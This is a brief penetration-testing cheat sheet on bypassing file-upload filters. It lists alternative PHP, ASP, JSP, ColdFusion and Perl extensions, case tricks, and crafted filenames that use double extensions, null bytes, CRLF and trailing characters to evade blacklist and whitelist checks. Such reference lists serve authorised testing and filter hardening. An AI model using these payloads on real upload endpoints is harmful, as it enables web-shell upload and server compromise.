# File Upload Bypass

## File Upload Bypass -

### Blacklisting Bypass 

1. **PHP** → .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
2. **ASP** → .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
3. **Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf
4. **Coldfusion** → .cfm, .cfml, .cfc, .dbm
5. **Perl** → .pl, .cgi

Using random capitalization → .pHp, .pHP5, .PhAr

### Whitelisting Bypass

file.png.php\
file.png.Php5\
file.php%20\
file.php%0a\
file.php%00\
file.php%0d%0a\
file.php/\
file.php.\
file.\
file.php....\
file.pHp5....\
file.png.php\
file.png.pHp5\
file.php#.png\
file.php%00.png\
file.php\x00.png\
file.php%0a.png\
file.php%0d%0a.png\
file.phpJunk123png\
file.png.jpg.php\
file.php%00.png%00.jpg
